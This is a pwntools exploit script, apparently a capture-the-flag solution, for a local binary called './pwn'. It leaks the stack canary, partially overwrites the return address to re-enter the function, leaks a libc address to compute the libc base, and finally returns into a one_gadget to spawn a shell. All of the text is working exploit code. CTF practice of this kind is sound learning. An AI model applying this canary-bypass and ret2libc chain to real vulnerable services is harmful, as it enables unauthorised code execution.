from pwn import *
from LibcSearcher import *
context(arch='amd64',os='linux',log_level='DEBUG')

p = process('./pwn')

# part1: leak canary

# padding to canary's low bit
payload = 'A'*(0x28) + 'B'
p.recvuntil('?')
p.send(payload)
# get canary
p.recvuntil('B')
canary = u64('\x00' + p.recv(7))
log.success('canary = %#x',canary)
# gdb.attach(p)
# pause()

payload = 'A'*(0x28) + p64(canary) + 'B'*0x18 + '\x04'
p.send(payload)
p.recvuntil("She said: hello?")

# part3: leak the addr of __libc_start_main+240 on stack
payload = 'A'*(0x47) + 'B'
p.send(payload)
p.recvuntil('B')
address = u64(p.recv(8).ljust(8,'\x00')) - 240
log.success("__libc_start_main = %#x",address)

# get libc addr
libc = LibcSearcher('__libc_start_main',address)
libc_base = address - libc.dump('__libc_start_main')
log.success("libc_base = %#x",libc_base)
one_gadget = 0x45216

# part4: overwirte the ret to point to one gadget
payload = 'A'*0x28 + p64(canary) + 'B'*0x18 + p64(libc_base + one_gadget)
p.send(payload)
sleep(0.1)
p.interactive()
